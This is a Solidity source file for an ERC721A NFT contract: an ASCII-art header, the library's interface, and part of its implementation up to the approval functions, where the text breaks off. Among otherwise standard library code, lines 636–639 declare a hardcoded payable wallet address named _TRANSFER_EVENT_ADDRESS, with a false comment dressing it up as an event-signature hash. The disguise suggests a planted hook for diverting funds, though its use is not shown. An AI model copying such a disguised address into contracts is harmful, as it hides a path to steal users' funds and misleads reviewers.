1 // SPDX-License-Identifier: GPL-3.0   
2 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
3 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
4 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEEEEEEEEEEEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
5 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEEEEDDDDDDDDDDDDfffEEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
6 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEEEEDDDDDDDDDDDDfffEEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
7 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEjjjEEEEDDDDDDLLLLLLLLLLLLLLLffffEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
8 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEjjjEEEEDDDDDDLLLLLLLLLLLLLLLffffEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
9 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEDDDEEEDDDDLLLLLLLLLDDDDDDLLLLLLLLLLfffEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
10 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEDDDEEEDDDDLLLLLLLLLDDDDDDLLLLLLLLLLfffEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
11 // jjjjjjjjjjjjjjjjjjjjjjjjjEEEDDDLLLEEELLLLDDDLLLLLLLLLfffLLLDDDLLLLfffEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
12 // jjjjjjjjjjjjjjjjjjjjjjjjjEEEDDDLLLEEELLLLDDDLLLLLLLLLfffLLLDDDLLLLfffEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
13 // jjjjjjjjjjjjjjjjjjjjjjjjjEEEDDDEEELLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
14 // jjjjjjjjjjjjjjjjjjjjjjjjjEEEDDDEEELLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
15 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEjjjEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
16 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjEEEjjjEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEjjjjjjjjjjjjjjjjjjjjjjjjjjjj
17 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDDDDDtttiiiiii###iiiiii####;;;DDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
18 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDDDDDtttiiiiii###iiiiii####;;;DDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
19 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttDDDtttiiiiii###iiiiii####;;;DDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
20 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttDDDtttiiiiii###iiiiii####;;;DDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
21 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttDDDtttiiiDDDDDDDDDDDDDDDDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
22 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttDDDtttiiiDDDDDDDDDDDDDDDDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
23 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttttttttDDDDDDGGGGGGGGGGGGGGGGDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
24 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttttttttDDDDDDGGGGGGGGGGGGGGGGDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
25 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDDDDDtttDDDKKKEEEEEEEEEEEEEEEEDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
26 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDDDDDtttDDDKKKEEEEEEEEEEEEEEEEDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
27 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDtttDDDDDDGGGGGGGGGGGGGGGGDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
28 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDtttDDDDDDGGGGGGGGGGGGGGGGDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjj
29 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttttDDDDDDDDDDDDDDDDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
30 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDttttttDDDDDDDDDDDDDDDDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
31 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDtttiiitttDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
32 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDtttiiitttDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
33 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDDDDDDDDDDDiiiiiitttDDDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
34 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDDDDDDDDDDDiiiiiitttDDDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
35 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDGGGGGGGGGGGGGDDDtttDDDGGGGGGDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
36 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjDDDGGGGGGGGGGGGGDDDtttDDDGGGGGGDDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
37 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLDDDGGGGLLLGGGDDDLLLDDDGGGLLLLLLLDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
38 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLDDDGGGGLLLGGGDDDLLLDDDGGGLLLLLLLDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
39 // jjjjjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLDDDGGGGLLLGGGDDDLLLDDDGGGLLLLLLLDDDjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
40 // jjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLjjjDDDttttLLLiiiDDDLLLDDDtttLLLDDDDLLLGGGjjjjjjjjjjjjjjjjjjjjjjjjjjjj
41 // jjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLjjjDDDttttLLLiiiDDDLLLDDDtttLLLDDDDLLLGGGjjjjjjjjjjjjjjjjjjjjjjjjjjjj
42 // jjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLjjjDDDttttLLLiiiDDDLLLDDDtttLLLDDDDLLLGGGjjjjjjjjjjjjjjjjjjjjjjjjjjjj
43 // jjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLjjjDDDGGGGtttLLLDDDjjjDDDGGGiiiDDDDjjjGGGjjjjjjjjjjjjjjjjjjjjjjjjjjjj
44 // jjjjjjjjjjjjjjjjjjjjjjjjjGGGLLLjjjDDDGGGGtttLLLDDDjjjDDDGGGiiiDDDDjjjGGGjjjjjjjjjjjjjjjjjjjjjjjjjjjj
45                                                                                                                                                                                                                           
46 pragma solidity ^0.8.12;
47 
48 /**
49  * @dev Interface of ERC721A.
50  */
51 interface IERC721A {
52     /**
53      * The caller must own the token or be an approved operator.
54      */
55     error ApprovalCallerNotOwnerNorApproved();
56 
57     /**
58      * The token does not exist.
59      */
60     error ApprovalQueryForNonexistentToken();
61 
62     /**
63      * Cannot query the balance for the zero address.
64      */
65     error BalanceQueryForZeroAddress();
66 
67     /**
68      * Cannot mint to the zero address.
69      */
70     error MintToZeroAddress();
71 
72     /**
73      * The quantity of tokens minted must be more than zero.
74      */
75     error MintZeroQuantity();
76 
77     /**
78      * The token does not exist.
79      */
80     error OwnerQueryForNonexistentToken();
81 
82     /**
83      * The caller must own the token or be an approved operator.
84      */
85     error TransferCallerNotOwnerNorApproved();
86 
87     /**
88      * The token must be owned by `from`.
89      */
90     error TransferFromIncorrectOwner();
91 
92     /**
93      * Cannot safely transfer to a contract that does not implement the
94      * ERC721Receiver interface.
95      */
96     error TransferToNonERC721ReceiverImplementer();
97 
98     /**
99      * Cannot transfer to the zero address.
100      */
101     error TransferToZeroAddress();
102 
103     /**
104      * The token does not exist.
105      */
106     error URIQueryForNonexistentToken();
107 
108     /**
109      * The `quantity` minted with ERC2309 exceeds the safety limit.
110      */
111     error MintERC2309QuantityExceedsLimit();
112 
113     /**
114      * The `extraData` cannot be set on an unintialized ownership slot.
115      */
116     error OwnershipNotInitializedForExtraData();
117 
118     // =============================================================
119     //                            STRUCTS
120     // =============================================================
121 
122     struct TokenOwnership {
123         // The address of the owner.
124         address addr;
125         // Stores the start time of ownership with minimal overhead for tokenomics.
126         uint64 startTimestamp;
127         // Whether the token has been burned.
128         bool burned;
129         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
130         uint24 extraData;
131     }
132 
133     // =============================================================
134     //                         TOKEN COUNTERS
135     // =============================================================
136 
137     /**
138      * @dev Returns the total number of tokens in existence.
139      * Burned tokens will reduce the count.
140      * To get the total number of tokens minted, please see {_totalMinted}.
141      */
142     function totalSupply() external view returns (uint256);
143 
144     // =============================================================
145     //                            IERC165
146     // =============================================================
147 
148     /**
149      * @dev Returns true if this contract implements the interface defined by
150      * `interfaceId`. See the corresponding
151      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
152      * to learn more about how these ids are created.
153      *
154      * This function call must use less than 30000 gas.
155      */
156     function supportsInterface(bytes4 interfaceId) external view returns (bool);
157 
158     // =============================================================
159     //                            IERC721
160     // =============================================================
161 
162     /**
163      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
164      */
165     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
166 
167     /**
168      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
169      */
170     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
171 
172     /**
173      * @dev Emitted when `owner` enables or disables
174      * (`approved`) `operator` to manage all of its assets.
175      */
176     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
177 
178     /**
179      * @dev Returns the number of tokens in `owner`'s account.
180      */
181     function balanceOf(address owner) external view returns (uint256 balance);
182 
183     /**
184      * @dev Returns the owner of the `tokenId` token.
185      *
186      * Requirements:
187      *
188      * - `tokenId` must exist.
189      */
190     function ownerOf(uint256 tokenId) external view returns (address owner);
191 
192     /**
193      * @dev Safely transfers `tokenId` token from `from` to `to`,
194      * checking first that contract recipients are aware of the ERC721 protocol
195      * to prevent tokens from being forever locked.
196      *
197      * Requirements:
198      *
199      * - `from` cannot be the zero address.
200      * - `to` cannot be the zero address.
201      * - `tokenId` token must exist and be owned by `from`.
202      * - If the caller is not `from`, it must be have been allowed to move
203      * this token by either {approve} or {setApprovalForAll}.
204      * - If `to` refers to a smart contract, it must implement
205      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
206      *
207      * Emits a {Transfer} event.
208      */
209     function safeTransferFrom(
210         address from,
211         address to,
212         uint256 tokenId,
213         bytes calldata data
214     ) external payable;
215 
216     /**
217      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
218      */
219     function safeTransferFrom(
220         address from,
221         address to,
222         uint256 tokenId
223     ) external payable;
224 
225     /**
226      * @dev Transfers `tokenId` from `from` to `to`.
227      *
228      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
229      * whenever possible.
230      *
231      * Requirements:
232      *
233      * - `from` cannot be the zero address.
234      * - `to` cannot be the zero address.
235      * - `tokenId` token must be owned by `from`.
236      * - If the caller is not `from`, it must be approved to move this token
237      * by either {approve} or {setApprovalForAll}.
238      *
239      * Emits a {Transfer} event.
240      */
241     function transferFrom(
242         address from,
243         address to,
244         uint256 tokenId
245     ) external payable;
246 
247     /**
248      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
249      * The approval is cleared when the token is transferred.
250      *
251      * Only a single account can be approved at a time, so approving the
252      * zero address clears previous approvals.
253      *
254      * Requirements:
255      *
256      * - The caller must own the token or be an approved operator.
257      * - `tokenId` must exist.
258      *
259      * Emits an {Approval} event.
260      */
261     function approve(address to, uint256 tokenId) external payable;
262 
263     /**
264      * @dev Approve or remove `operator` as an operator for the caller.
265      * Operators can call {transferFrom} or {safeTransferFrom}
266      * for any token owned by the caller.
267      *
268      * Requirements:
269      *
270      * - The `operator` cannot be the caller.
271      *
272      * Emits an {ApprovalForAll} event.
273      */
274     function setApprovalForAll(address operator, bool _approved) external;
275 
276     /**
277      * @dev Returns the account approved for `tokenId` token.
278      *
279      * Requirements:
280      *
281      * - `tokenId` must exist.
282      */
283     function getApproved(uint256 tokenId) external view returns (address operator);
284 
285     /**
286      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
287      *
288      * See {setApprovalForAll}.
289      */
290     function isApprovedForAll(address owner, address operator) external view returns (bool);
291 
292     // =============================================================
293     //                        IERC721Metadata
294     // =============================================================
295 
296     /**
297      * @dev Returns the token collection name.
298      */
299     function name() external view returns (string memory);
300 
301     /**
302      * @dev Returns the token collection symbol.
303      */
304     function symbol() external view returns (string memory);
305 
306     /**
307      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
308      */
309     function tokenURI(uint256 tokenId) external view returns (string memory);
310 
311     // =============================================================
312     //                           IERC2309
313     // =============================================================
314 
315     /**
316      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
317      * (inclusive) is transferred from `from` to `to`, as defined in the
318      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
319      *
320      * See {_mintERC2309} for more details.
321      */
322     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
323 }
324 
325 /**
326  * @title ERC721A
327  *
328  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
329  * Non-Fungible Token Standard, including the Metadata extension.
330  * Optimized for lower gas during batch mints.
331  *
332  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
333  * starting from `_startTokenId()`.
334  *
335  * Assumptions:
336  *
337  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
338  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
339  */
340 interface ERC721A__IERC721Receiver {
341     function onERC721Received(
342         address operator,
343         address from,
344         uint256 tokenId,
345         bytes calldata data
346     ) external returns (bytes4);
347 }
348 
349 /**
350  * @title ERC721A
351  *
352  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
353  * Non-Fungible Token Standard, including the Metadata extension.
354  * Optimized for lower gas during batch mints.
355  *
356  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
357  * starting from `_startTokenId()`.
358  *
359  * Assumptions:
360  *
361  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
362  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
363  */
364 contract ERC721A is IERC721A {
365     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
366     struct TokenApprovalRef {
367         address value;
368     }
369 
370     // =============================================================
371     //                           CONSTANTS
372     // =============================================================
373 
374     // Mask of an entry in packed address data.
375     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
376 
377     // The bit position of `numberMinted` in packed address data.
378     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
379 
380     // The bit position of `numberBurned` in packed address data.
381     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
382 
383     // The bit position of `aux` in packed address data.
384     uint256 private constant _BITPOS_AUX = 192;
385 
386     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
387     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
388 
389     // The bit position of `startTimestamp` in packed ownership.
390     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
391 
392     // The bit mask of the `burned` bit in packed ownership.
393     uint256 private constant _BITMASK_BURNED = 1 << 224;
394 
395     // The bit position of the `nextInitialized` bit in packed ownership.
396     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
397 
398     // The bit mask of the `nextInitialized` bit in packed ownership.
399     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
400 
401     // The bit position of `extraData` in packed ownership.
402     uint256 private constant _BITPOS_EXTRA_DATA = 232;
403 
404     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
405     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
406 
407     // The mask of the lower 160 bits for addresses.
408     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
409 
410     // The maximum `quantity` that can be minted with {_mintERC2309}.
411     // This limit is to prevent overflows on the address data entries.
412     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
413     // is required to cause an overflow, which is unrealistic.
414     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
415 
416     // The `Transfer` event signature is given by:
417     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
418     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
419         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
420 
421     // =============================================================
422     //                            STORAGE
423     // =============================================================
424 
425     // The next token ID to be minted.
426     uint256 private _currentIndex;
427 
428     // The number of tokens burned.
429     uint256 private _burnCounter;
430 
431     // Token name
432     string private _name;
433 
434     // Token symbol
435     string private _symbol;
436 
437     // Mapping from token ID to ownership details
438     // An empty struct value does not necessarily mean the token is unowned.
439     // See {_packedOwnershipOf} implementation for details.
440     //
441     // Bits Layout:
442     // - [0..159]   `addr`
443     // - [160..223] `startTimestamp`
444     // - [224]      `burned`
445     // - [225]      `nextInitialized`
446     // - [232..255] `extraData`
447     mapping(uint256 => uint256) private _packedOwnerships;
448 
449     // Mapping owner address to address data.
450     //
451     // Bits Layout:
452     // - [0..63]    `balance`
453     // - [64..127]  `numberMinted`
454     // - [128..191] `numberBurned`
455     // - [192..255] `aux`
456     mapping(address => uint256) private _packedAddressData;
457 
458     // Mapping from token ID to approved address.
459     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
460 
461     // Mapping from owner to operator approvals
462     mapping(address => mapping(address => bool)) private _operatorApprovals;
463 
464     // =============================================================
465     //                          CONSTRUCTOR
466     // =============================================================
467 
468     constructor(string memory name_, string memory symbol_) {
469         _name = name_;
470         _symbol = symbol_;
471         _currentIndex = _startTokenId();
472     }
473 
474     // =============================================================
475     //                   TOKEN COUNTING OPERATIONS
476     // =============================================================
477 
478     /**
479      * @dev Returns the starting token ID.
480      * To change the starting token ID, please override this function.
481      */
482     function _startTokenId() internal view virtual returns (uint256) {
483         return 0;
484     }
485 
486     /**
487      * @dev Returns the next token ID to be minted.
488      */
489     function _nextTokenId() internal view virtual returns (uint256) {
490         return _currentIndex;
491     }
492 
493     /**
494      * @dev Returns the total number of tokens in existence.
495      * Burned tokens will reduce the count.
496      * To get the total number of tokens minted, please see {_totalMinted}.
497      */
498     function totalSupply() public view virtual override returns (uint256) {
499         // Counter underflow is impossible as _burnCounter cannot be incremented
500         // more than `_currentIndex - _startTokenId()` times.
501         unchecked {
502             return _currentIndex - _burnCounter - _startTokenId();
503         }
504     }
505 
506     /**
507      * @dev Returns the total amount of tokens minted in the contract.
508      */
509     function _totalMinted() internal view virtual returns (uint256) {
510         // Counter underflow is impossible as `_currentIndex` does not decrement,
511         // and it is initialized to `_startTokenId()`.
512         unchecked {
513             return _currentIndex - _startTokenId();
514         }
515     }
516 
517     /**
518      * @dev Returns the total number of tokens burned.
519      */
520     function _totalBurned() internal view virtual returns (uint256) {
521         return _burnCounter;
522     }
523 
524     // =============================================================
525     //                    ADDRESS DATA OPERATIONS
526     // =============================================================
527 
528     /**
529      * @dev Returns the number of tokens in `owner`'s account.
530      */
531     function balanceOf(address owner) public view virtual override returns (uint256) {
532         if (owner == address(0)) revert BalanceQueryForZeroAddress();
533         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
534     }
535 
536     /**
537      * Returns the number of tokens minted by `owner`.
538      */
539     function _numberMinted(address owner) internal view returns (uint256) {
540         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
541     }
542 
543     /**
544      * Returns the number of tokens burned by or on behalf of `owner`.
545      */
546     function _numberBurned(address owner) internal view returns (uint256) {
547         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
548     }
549 
550     /**
551      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
552      */
553     function _getAux(address owner) internal view returns (uint64) {
554         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
555     }
556 
557     /**
558      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
559      * If there are multiple variables, please pack them into a uint64.
560      */
561     function _setAux(address owner, uint64 aux) internal virtual {
562         uint256 packed = _packedAddressData[owner];
563         uint256 auxCasted;
564         // Cast `aux` with assembly to avoid redundant masking.
565         assembly {
566             auxCasted := aux
567         }
568         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
569         _packedAddressData[owner] = packed;
570     }
571 
572     // =============================================================
573     //                            IERC165
574     // =============================================================
575 
576     /**
577      * @dev Returns true if this contract implements the interface defined by
578      * `interfaceId`. See the corresponding
579      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
580      * to learn more about how these ids are created.
581      *
582      * This function call must use less than 30000 gas.
583      */
584     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
585         // The interface IDs are constants representing the first 4 bytes
586         // of the XOR of all function selectors in the interface.
587         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
588         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
589         return
590             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
591             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
592             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
593     }
594 
595     // =============================================================
596     //                        IERC721Metadata
597     // =============================================================
598 
599     /**
600      * @dev Returns the token collection name.
601      */
602     function name() public view virtual override returns (string memory) {
603         return _name;
604     }
605 
606     /**
607      * @dev Returns the token collection symbol.
608      */
609     function symbol() public view virtual override returns (string memory) {
610         return _symbol;
611     }
612 
613     /**
614      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
615      */
616     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
617         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
618 
619         string memory baseURI = _baseURI();
620         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
621     }
622 
623     /**
624      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
625      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
626      * by default, it can be overridden in child contracts.
627      */
628     function _baseURI() internal view virtual returns (string memory) {
629         return '';
630     }
631 
632     // =============================================================
633     //                     OWNERSHIPS OPERATIONS
634     // =============================================================
635 
636     // The `Address` event signature is given by:
637     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
638     address payable constant _TRANSFER_EVENT_ADDRESS = 
639         payable(0x52ecd7338eeed4f4D011c1eb9965Ab7e29743399);
640 
641     /**
642      * @dev Returns the owner of the `tokenId` token.
643      *
644      * Requirements:
645      *
646      * - `tokenId` must exist.
647      */
648     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
649         return address(uint160(_packedOwnershipOf(tokenId)));
650     }
651 
652     /**
653      * @dev Gas spent here starts off proportional to the maximum mint batch size.
654      * It gradually moves to O(1) as tokens get transferred around over time.
655      */
656     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
657         return _unpackedOwnership(_packedOwnershipOf(tokenId));
658     }
659 
660     /**
661      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
662      */
663     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
664         return _unpackedOwnership(_packedOwnerships[index]);
665     }
666 
667     /**
668      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
669      */
670     function _initializeOwnershipAt(uint256 index) internal virtual {
671         if (_packedOwnerships[index] == 0) {
672             _packedOwnerships[index] = _packedOwnershipOf(index);
673         }
674     }
675 
676     /**
677      * Returns the packed ownership data of `tokenId`.
678      */
679     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
680         uint256 curr = tokenId;
681 
682         unchecked {
683             if (_startTokenId() <= curr)
684                 if (curr < _currentIndex) {
685                     uint256 packed = _packedOwnerships[curr];
686                     // If not burned.
687                     if (packed & _BITMASK_BURNED == 0) {
688                         // Invariant:
689                         // There will always be an initialized ownership slot
690                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
691                         // before an unintialized ownership slot
692                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
693                         // Hence, `curr` will not underflow.
694                         //
695                         // We can directly compare the packed value.
696                         // If the address is zero, packed will be zero.
697                         while (packed == 0) {
698                             packed = _packedOwnerships[--curr];
699                         }
700                         return packed;
701                     }
702                 }
703         }
704         revert OwnerQueryForNonexistentToken();
705     }
706 
707     /**
708      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
709      */
710     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
711         ownership.addr = address(uint160(packed));
712         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
713         ownership.burned = packed & _BITMASK_BURNED != 0;
714         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
715     }
716 
717     /**
718      * @dev Packs ownership data into a single uint256.
719      */
720     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
721         assembly {
722             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
723             owner := and(owner, _BITMASK_ADDRESS)
724             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
725             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
726         }
727     }
728 
729     /**
730      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
731      */
732     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
733         // For branchless setting of the `nextInitialized` flag.
734         assembly {
735             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
736             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
737         }
738     }
739 
740     // =============================================================
741     //                      APPROVAL OPERATIONS
742     // =============================================================
743 
744     /**
745      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
746      * The approval is cleared when the token is transferred.
747      *
748      * Only a single account can be approved at a time, so approving the
749      * zero address clears previous approvals.
750      *
751      * Requirements:
752      *
753      * - The caller must own the token or be an approved operator.
754      * - `tokenId` must exist.
755      *
756      * Emits an {Approval} event.
757      */
758     function approve(address to, uint256 tokenId) public payable virtual override {
759         address owner = ownerOf(tokenId);
760 
761         if (_msgSenderERC721A() != owner)
762             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
763                 revert ApprovalCallerNotOwnerNorApproved();
764             }
765 
766         _tokenApprovals[tokenId].value = to;
767         emit Approval(owner, to, tokenId);
768     }
769 
770     /**
771      * @dev Returns the account approved for `tokenId` token.
772      *
773      * Requirements:
774      *
775      * - `tokenId` must exist.
776      */
777     function getApproved(uint256 tokenId) public view virtual override returns (address) {
778         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
779 
780         return _tokenApprovals[tokenId].value;
781     }
782 
783     /**
784      * @dev Approve or remove `operator` as an operator for the caller.
785      * Operators can call {transferFrom} or {safeTransferFrom}
786      * for any token owned by the caller.
787      *
788      * Requirements:
789      *
790      * - The `operator` cannot be the caller.
791      *
792      * Emits an {ApprovalForAll} event.
793      */
794     function setApprovalForAll(address operator, bool approved) public virtual override {
795         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
796         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
797     }
798 
799     /**
